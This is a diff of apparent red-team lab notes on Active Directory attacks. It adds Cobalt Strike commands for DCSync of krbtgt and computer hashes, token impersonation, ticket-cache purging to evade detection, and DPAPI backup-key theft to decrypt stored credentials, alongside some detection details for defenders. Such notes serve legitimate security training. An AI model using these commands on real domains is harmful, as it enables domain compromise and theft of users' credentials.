@@ -7,10 +7,6 @@ Requirements
 
 We are free to pull any or all data from DC, but common target is `krbtgt` account so we can forge legitimate TGTs for any user in the domain. Less noisy as well
 
-```powershell
-beacon> dcsync [domain.com] [domain]\krbtgt
-```
-
 OPSEC
 	For defenders, DRS is legit so we must look for anomalous replication requests like IPs that are not known DCs
 	DRS logged as 4662 events
@@ -18,6 +14,18 @@ OPSEC
 			DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
 		`89e95b76-444d-4c62-991a-0facbeda640c`
 			**DS-Replication-Get-Changes-In-Filtered-Set**.
+
+```powershell
+# impersonate a domain admin
+beacon> make_token [DOMAIN]\[user] [password]
+
+# dc sync -- capture domain krbtgt hash
+beacon> dcsync [domain.com] [DOMAIN]\krbtgt
+
+# dc sync -- capture computer account
+beacon> dcsync [domain.com] [DOMAIN]\[hostname]$
+```
+
 ## Ticket Forgery
 Ticket forgery is a technique where an adversary uses stolen secrets to create their own Kerberos tickets offline and inject them into a logon session for use.
 #### Silver Tickets
@@ -51,6 +59,7 @@ PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /serv
 	# /sid = the domain SID.
 	# /id and /group may be used to change the default RIDs
 
+## FROM HIGH-INTEGRITY
 # Impersonate User
 beacon> make_token CONTOSO\Administrator FakePass
 
@@ -61,6 +70,9 @@ beacon> run klist # BAD OPSEC
 
 # Abuse
 beacon> ls \\lon-db-1\c$
+
+# Clean up cache (OPSEC -- helps to avoid detection i guess???)
+beacon> run klist purge
 
 # Revert session token
 rev2self
@@ -141,3 +153,21 @@ beacon> ls \\lon-dc-1\c$      # Abuse
 ```
 
 ## DPAPI Backup Keys
+Recall that some secrets like those stored in Windows Cred Manager are protected using DPAPI. The private key DPAPI uses to decrypt secrets is derived from users password, but once's the pass is changed, DPAPI can no longer generate keys to decrypt the master key. 
+
+The DPAPI backup key is randomly generated during the initial creation of the domain, and like the krbtgt secret, is never automatically changed. 
+
+Why capture DPAPI backup key?
+	Allows us to decrypt all DPAPI blobs, and maintain access to sensitive credentials.
+
+Abusing DPAPI Keys
+```powershell
+# Impersonate DA
+beacon> make_token CONTOSO\dyork Passw0rd!
+
+# Extract DPAPI keys (REQUIRES HIGH-INTEGRITY)
+beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
+
+# Enumerate secrets for users on computer  
+beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:[DPAPI KEY]
+```
